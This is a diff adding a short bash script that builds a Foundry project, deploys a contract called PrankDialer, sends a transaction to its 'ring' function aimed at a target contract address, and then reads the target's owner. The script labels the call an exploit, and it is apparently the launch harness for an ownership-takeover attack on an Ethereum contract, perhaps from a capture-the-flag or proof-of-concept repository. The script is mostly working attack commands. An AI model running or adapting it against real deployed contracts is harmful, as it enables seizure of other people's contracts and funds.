@@ -1,0 +1,13 @@
+#!/bin/bash
+echo building and testing on fork
+forge build
+forge test --fork-url $ETH_RPC_URL -vv
+
+echo deploying PrankDialer contract
+EXPLOIT_CONTRACT=$(forge create --private-key $PRIVATE_KEY --json src/PrankDialer.sol:PrankDialer | jq '.deployedTo' --raw-output | cat)
+
+echo calling exploit
+cast send --private-key $PRIVATE_KEY $EXPLOIT_CONTRACT "ring(address,address)" $CONTRACT_ADDRESS $MY_ADDRESS
+
+echo new owner is:
+cast call $CONTRACT_ADDRESS "owner()(address)"
